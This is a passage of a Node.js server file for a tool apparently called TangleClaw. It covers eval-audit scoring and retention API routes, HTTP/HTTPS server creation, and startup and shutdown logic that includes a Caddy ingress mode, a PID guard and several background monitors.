// POST /api/audit/:project/scores/:id/human — Submit human score for an exchange
route('POST', '/api/audit/:project/scores/:id/human', (_req, res, params, body) => {
  try {
    const score = store.evalScores.get(params.id);
    if (!score) {
      return errorResponse(res, 404, 'Score record not found', 'NOT_FOUND');
    }
    // Verify score belongs to the project
    const exchange = store.evalExchanges.get(score.exchangeId);
    if (!exchange || exchange.project !== params.project) {
      return errorResponse(res, 404, 'Score record not found for this project', 'NOT_FOUND');
    }
    const validation = evalAudit.validateHumanScore(body);
    if (!validation.valid) {
      return errorResponse(res, 400, validation.error, 'VALIDATION');
    }
    const updated = store.evalScores.updateHumanScore(params.id, body);
    return jsonResponse(res, 200, { score: updated });
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// POST /api/audit/retention/run — Manually trigger retention policy
route('POST', '/api/audit/retention/run', (_req, res, _params, body) => {
  try {
    const retentionDays = (body && body.retentionDays) || 90;
    const result = evalAudit.runRetentionPolicy(store, retentionDays);
    return jsonResponse(res, 200, result);
  } catch (err) {
    return errorResponse(res, 500, err.message, 'INTERNAL');
  }
});

// ── Server Creation ──

/**
 * Create and configure the HTTP server (does not start listening).
 * @returns {http.Server}
 */
/**
 * Create and configure the HTTP/HTTPS server (does not start listening).
 * @param {object} [options]
 * @param {boolean} [options.httpsEnabled] - Use HTTPS
 * @param {string} [options.certPath] - Path to TLS certificate
 * @param {string} [options.keyPath] - Path to TLS private key
 * @returns {http.Server|https.Server}
 */
function createServer(options = {}) {
  let server;
  if (options.httpsEnabled && options.certPath && options.keyPath) {
    try {
      const cert = fs.readFileSync(options.certPath);
      const key = fs.readFileSync(options.keyPath);
      server = https.createServer({ cert, key }, handleRequest);
      log.info('HTTPS enabled', { cert: options.certPath });
    } catch (err) {
      log.warn('HTTPS enabled but cert/key could not be loaded — falling back to HTTP. Fix cert paths in Settings or regenerate via the setup wizard.', {
        certPath: options.certPath,
        keyPath: options.keyPath,
        error: err.message
      });
      server = http.createServer(handleRequest);
    }
  } else {
    if (options.httpsEnabled && (!options.certPath || !options.keyPath)) {
      log.warn('HTTPS enabled but cert/key paths not configured — falling back to HTTP. Run the setup wizard (Settings → HTTPS) to generate certificates.', {
        certPath: options.certPath || null,
        keyPath: options.keyPath || null
      });
    }
    server = http.createServer(handleRequest);
  }
  server.on('upgrade', handleUpgrade);
  return server;
}

// ── Main ──

if (require.main === module) {
  // Configure log level from env or config
  const envLogLevel = process.env.TANGLECLAW_LOG_LEVEL;
  if (envLogLevel) {
    setLevel(envLogLevel);
  }

  // Capture git HEAD SHA at boot for stale-server detection (#199).
  // Doing this before store.init keeps the snapshot honest — any code
  // paths the store init triggers run against the SHA we just stamped.
  serverInfo.captureStartup();

  // Initialize store (needed for config before PID check)
  store.init();
  const config = store.config.load();

  // PID file guard — prevent duplicate instances
  const existingPid = pidfile.check();
  if (existingPid) {
    // eslint-disable-next-line no-console
    console.error(`TangleClaw is already running (PID ${existingPid}). Exiting.`);
    process.exit(1);
  }
  pidfile.write();

  // Initialize file logging
  initFileLogging(path.join(store._getBasePath(), 'logs'));

  if (!envLogLevel && config.logLevel) {
    setLevel(config.logLevel);
  }

  // #397 credential durability (2026-07-03 lockout): in caddy mode, if the live
  // Caddyfile carries a basic_auth credential that the canonical config doesn't,
  // adopt it into config at boot — READ-ONLY on the Caddyfile. Makes the working
  // credential durable so every future regeneration (cutover, reset-admin)
  // re-emits the same hash instead of losing it with the file. Never overwrites
  // an existing config credential; non-throwing.
  if (config.ingressMode === 'caddy') {
    caddy.adoptCredentialIntoConfig();
  }

  // Bootstrap port management — resolve actual port (env var takes precedence)
  const port = process.env.TANGLECLAW_PORT || config.serverPort || 3101;
  // AUTH-1 (#395): the ttydPort lease is kept even in caddy mode, where ttyd is
  // socket-bound and nothing listens on :3100. This is deliberate — reserving the
  // port keeps it free so a rollback to direct mode rebinds cleanly, rather than
  // racing another project for it. (Critic warning, ADR 0003.)
  porthub.bootstrap({ ttydPort: config.ttydPort || 3100, serverPort: port });
  porthub.startExpirationTimer();

  // AUTH-1 (#395): in 'caddy' ingress mode Caddy terminates TLS and is the only
  // front door, so TC drops to plain HTTP bound to localhost only (Caddy reaches
  // it over the loopback). 'direct' mode is unchanged — TC terminates its own
  // HTTPS and binds all interfaces. The live cutover is operator-driven; until
  // ingressMode is flipped this branch is inert.
  const caddyMode = config.ingressMode === 'caddy';
  const effectiveHttps = caddyMode ? false : !!config.httpsEnabled;
  const server = createServer({
    httpsEnabled: effectiveHttps,
    certPath: config.httpsCertPath || null,
    keyPath: config.httpsKeyPath || null
  });

  // Start model status monitor
  modelStatus.startMonitor(store.engines.list(), config.modelStatusIntervalMs || 120000);

  // Start update checker (first check 60s after startup, then every 24h)
  updateChecker.startChecker(config.updateCheckIntervalMs || 24 * 60 * 60 * 1000);

  // Start eval audit heartbeat watchdog
  evalAudit.startWatchdog((level, sessionId, project, message) => {
    log.warn('Eval audit watchdog alert', { level, sessionId, project, message });
  });

  // Start sidecar polling for active OpenClaw sessions
  sidecar.syncPolling();

  // Run retention policy on startup (purge old eval data)
  try {
    const retentionDays = store.DEFAULT_PROJECT_CONFIG.evalAuditMode.retentionDays || 90;
    const retentionResult = evalAudit.runRetentionPolicy(store, retentionDays);
    if (retentionResult.exchangesPurged > 0) {
      log.info('Startup retention policy', retentionResult);
    }
  } catch (err) {
    log.warn('Startup retention policy failed', { error: err.message });
  }

  // Sync all projects: ensure scaffolding + regenerate engine configs
  try {
    const syncResult = projects.syncAllProjects();
    if (syncResult.synced > 0) {
      log.info('Startup project sync', syncResult);
    }
    if (syncResult.errors.length > 0) {
      log.warn('Startup project sync errors', { errors: syncResult.errors });
    }
  } catch (err) {
    log.warn('Startup project sync failed', { error: err.message });
  }

  // Start document lock expiry timer (every 5 minutes)
  const _lockExpiryInterval = setInterval(() => {
    try {
      store.documentLocks.expireStale();
    } catch (err) {
      log.warn('Lock expiry sweep failed', { error: err.message });
    }
  }, 5 * 60 * 1000);

  const protocol = effectiveHttps ? 'https' : 'http';
  const bindHost = caddyMode ? '127.0.0.1' : null;
  const bindLabel = caddyMode ? '127.0.0.1' : '*';

  server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
      log.error(`Port ${port} is already in use — another process is bound to it. Exiting.`);
      pidfile.remove();
      process.exit(1);
    }
    throw err;
  });

  const onListening = () => {
    log.info(`TangleClaw v${_getVersion()} listening on ${protocol}://${bindLabel}:${port}${caddyMode ? ' (behind Caddy)' : ''}`, {
      node: process.version,
      pid: process.pid,
      https: effectiveHttps,
      ingressMode: config.ingressMode || 'direct'
    });
    // Start ttyd zombie-child watcher (#94). macOS-only; no-op elsewhere.
    ttydWatcher.start();
    // Start OpenClaw tunnel liveness monitor (#294) — auto-recreates tunnels
    // that die out from under an open Web UI so they self-heal without a
    // manual re-launch.
    tunnelMonitor.start();
    // Start the typed-wrap sentinel monitor (CC-7 Slice C) — watches live
    // sessions for the `TANGLECLAW_WRAP` marker and raises a per-project flag
    // that the session view's status poll turns into an opened wrap drawer.
    wrapSentinel.start();
  };

  // Bind localhost-only in caddy mode (Caddy fronts us); all interfaces otherwise.
  if (bindHost) {
    server.listen(port, bindHost, onListening);
  } else {
    server.listen(port, onListening);
  }

  // Graceful shutdown
  const shutdown = () => {
    log.info('Shutting down');
    pidfile.remove();
    porthub.shutdown({ ttydPort: config.ttydPort || 3100, serverPort: port });
    porthub.stopExpirationTimer();
    modelStatus.stopMonitor();
    updateChecker.stopChecker();
    evalAudit.stopWatchdog();
    sidecar.stopAllPolling();
    ttydWatcher.stop();
    tunnelMonitor.stop();
    wrapSentinel.stop();
    clearInterval(_lockExpiryInterval);
    server.close();
    store.close();
    process.exit(0);
  };

  process.on('SIGTERM', shutdown);
  process.on('SIGINT', shutdown);
  process.on('uncaughtException', (err) => {
    log.error('Uncaught exception', { error: err.message, stack: err.stack });
  });
  process.on('unhandledRejection', (reason) => {
    log.error('Unhandled rejection', { error: String(reason) });
  });
}

module.exports = { createServer, handleRequest, handleUpgrade, route, matchRoute, jsonResponse, errorResponse, parseBody, parseQuery, MAX_BODY_SIZE, _setRestartScheduler };
